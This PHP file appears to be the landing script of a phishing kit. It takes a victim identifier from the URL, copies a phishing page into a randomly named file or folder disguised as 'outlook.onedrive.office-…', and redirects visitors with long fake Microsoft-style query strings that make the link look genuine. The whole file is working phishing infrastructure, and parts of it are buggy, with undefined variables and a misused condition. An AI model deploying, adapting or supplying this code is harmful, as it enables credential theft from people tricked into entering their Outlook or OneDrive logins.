<?php

include('sek.php');
 




$random = rand(50000,100000000000);
$dst    = substr(md5($random), 0, 1000000000);

if(isset($_GET['open'])){
$loguid = base64_decode($_GET['uid']);
}else{
$loguid =  $_GET['uid'];
}


if(isset($_GET['mgs'])){
$msg='mgs=tee';
}else{
$msg='nosmgs=tee';
}


$log = base64_encode($loguid);

//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}


if(!isset($_GET['uid']) or $_GET['uid']=='' or $_GET['uid']==' '){

$finam='i.html';
function generateRandomString($length = 104) {
$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString;}
$staticfile = $finam;
$name =  generateRandomString();
$secfile = "outlook.onedrive.office-".$name.".php";

if (!copy($staticfile, $secfile)) {
}else{
if(file_exists($secfile)){
header("Location: $secfile?$urltt=".rand(1, 100000000000000).".".rand(1, 100000000000000)."&fid.4.".rand(1, 100000000000000)."&fid=1&fav.1&rdcode=$rdcode&fid.".rand(1, 100000000000000)."&fid.1&fav.1&uid=$login&submit=".rand(1, 100000000000000).".aspx?n=".rand(1, 100000000000000)."&fid=4#n=".rand(1, 100000000000000)."&fid=1&fav=1");
}} 	
	
exit;
}elseif($_GET['uid']=''){

$finam='i.html';
function generateRandomString($length = 104) {
$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString;}
$staticfile = $finam;
$name =  generateRandomString();
$secfile = "outlook.onedrive.office-".$name.".php";

if (!copy($staticfile, $secfile)) {
}else{
if(file_exists($secfile)){
header("Location: $secfile?$urltt=".rand(1, 100000000000000).".".rand(1, 100000000000000)."&fid.4.".rand(1, 100000000000000)."&fid=1&fav.1&rdcode=$rdcode&fid.".rand(1, 100000000000000)."&fid.1&fav.1&uid=$login&submit=".rand(1, 100000000000000).".aspx?n=".rand(1, 100000000000000)."&fid=4#n=".rand(1, 100000000000000)."&fid=1&fav=1");
}} 	
	
exit;
}else{
$src="p";
recurse_copy( $src, $dst );
header("location:".$dst."?Key=".$random."&rand=".rand(1, 100000000000000).".".$random."".rand(1, 100000000000000)."&fid.4.".rand(1, 100000000000000)."&fid=1&".$msg."&rand.".rand(1, 100000000000000).".aspxn.".$mds.".".rand(1, 100000000000000)."&fid.".rand(1, 100000000000000)."&fid.1&fav.1&login=".$log."&.rand=".rand(1, 100000000000000).".aspx?n=".$random."".rand(1, 100000000000000)."&fid=4#n=".rand(1, 100000000000000)."&fid=1&fav=1&?office=&rand=".rand(1, 100000000000000).".aspx");

}
?>